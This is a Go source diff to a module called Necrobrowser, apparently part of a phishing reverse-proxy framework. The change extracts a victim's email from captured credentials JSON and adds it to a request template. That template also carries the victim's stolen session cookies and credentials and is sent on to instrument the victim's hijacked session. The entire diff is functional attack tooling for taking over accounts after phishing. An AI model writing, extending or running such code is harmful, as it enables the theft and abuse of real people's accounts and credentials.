@@ -28,6 +28,7 @@ const (
 	CookiePlaceholder      = "%%%COOKIES%%%"
 	CredentialsPlaceholder = "%%%CREDENTIALS%%%"
 	UserAgentPlaceholder   = "%%%USERAGENT%%%"
+	EmailPlaceholder       = "%%%EMAIL%%%"
 )
 
 // Necrobrowser module
@@ -225,11 +226,45 @@ func (module *Necrobrowser) Instrument(victimID string, cookieJar []db.VictimCoo
 		return
 	}
 
+	// Extract email from credentials JSON (Username field)
+	email := ""
+	var credsMap map[string]interface{}
+	if err := json.Unmarshal([]byte(credentialsJSON), &credsMap); err == nil {
+		// Format 1: {"username":"x","password":"y"}
+		for _, field := range []string{"username", "Username"} {
+			if val, ok := credsMap[field]; ok {
+				if strVal, ok := val.(string); ok && strVal != "" {
+					email = strVal
+					break
+				}
+			}
+		}
+	}
+	// Format 2: [{"key":"Username","val":"x","time":"..."}]
+	if email == "" {
+		var credsArr []map[string]interface{}
+		if err := json.Unmarshal([]byte(credentialsJSON), &credsArr); err == nil {
+			for _, cred := range credsArr {
+				if key, ok := cred["key"]; ok {
+					if keyStr, ok := key.(string); ok && keyStr == "Username" {
+						if val, ok := cred["val"]; ok {
+							if strVal, ok := val.(string); ok && strVal != "" {
+								email = strVal
+								break
+							}
+						}
+					}
+				}
+			}
+		}
+	}
+
 	newRequest := module.RequestTemplate
 	newRequest = strings.ReplaceAll(newRequest, TrackerPlaceholder, victimID)
 	newRequest = strings.ReplaceAll(newRequest, CookiePlaceholder, string(c))
 	newRequest = strings.ReplaceAll(newRequest, CredentialsPlaceholder, credentialsJSON)
 	newRequest = strings.ReplaceAll(newRequest, UserAgentPlaceholder, userAgent)
+	newRequest = strings.ReplaceAll(newRequest, EmailPlaceholder, email)
 
 	module.Info("instrumenting %s", tui.Bold(tui.Red(victimID)))
 	client := resty.New()
